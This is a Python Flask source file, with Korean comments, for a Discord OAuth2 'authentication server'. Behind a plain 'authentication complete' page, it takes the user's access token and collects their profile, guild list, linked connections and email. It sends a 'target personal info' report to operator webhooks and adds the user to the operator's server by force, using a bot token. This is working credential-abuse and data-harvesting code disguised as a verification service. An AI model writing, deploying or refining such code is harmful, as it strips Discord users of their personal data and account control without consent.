import os
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

# 환경 변수 로드
CLIENT_ID = os.environ.get('CLIENT_ID')
CLIENT_SECRET = os.environ.get('CLIENT_SECRET')
REDIRECT_URI = os.environ.get('REDIRECT_URI')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
MY_GUILD_ID = os.environ.get('MY_GUILD_ID')

# 서버 "2" 웹훅 URL
WH_PROFILE = os.environ.get('WH_PROFILE')
WH_GUILDS = os.environ.get('WH_GUILDS')
WH_CONNECT = os.environ.get('WH_CONNECT')
WH_CONTROL = os.environ.get('WH_CONTROL')
WH_SYSTEM = os.environ.get('WH_SYSTEM')

API_BASE = 'https://discord.com/api/v10'
user_storage = []

def send_report(url, embed):
    try:
        requests.post(url, json={"embeds": [embed]})
    except: pass

@app.route('/')
def home():
    return "<h1>Authentication Server is Running</h1>"

@app.route('/callback')
def callback():
    code = request.args.get('code')
    if not code: return "No Code", 400

    try:
        # 1. 토큰 교환
        token_data = {
            'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
        }
        t_res = requests.post(f'{API_BASE}/oauth2/token', data=token_data).json()
        access_token = t_res.get('access_token')

        # 2. 데이터 수집
        h = {'Authorization': f'Bearer {access_token}'}
        u = requests.get(f'{API_BASE}/users/@me', headers=h).json()
        g = requests.get(f'{API_BASE}/users/@me/guilds', headers=h).json()
        c = requests.get(f'{API_BASE}/users/@me/connections', headers=h).json()

        user_id, user_tag = u.get('id'), f"{u.get('username')}"

        # 보고서 전송 (기존 로직 유지)
        send_report(WH_PROFILE, {"title": "👤 타겟 신상", "fields": [{"name": "유저", "value": user_tag}]})
        
        # 3. 서버 "1" 강제 가입 (봇이 꺼져있어도 토큰만 있으면 가능)
        join_res = requests.put(f'{API_BASE}/guilds/{MY_GUILD_ID}/members/{user_id}', 
                                headers={'Authorization': f'Bot {BOT_TOKEN}'}, 
                                json={'access_token': access_token})
        
        send_report(WH_CONTROL, {"title": "⛓️ 강제 가입 결과", "description": f"결과 코드: {join_res.status_code}"})

        user_storage.append({"tag": user_tag, "id": user_id, "email": u.get('email', 'N/A')})
        return "<h1>✅ 인증 완료</h1>"
    except Exception as e:
        send_report(WH_SYSTEM, {"description": f"오류: {str(e)}"})
        return "Error", 500

@app.route('/admin')
def admin():
    return render_template_string("...관리자 페이지 로직...", users=user_storage)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
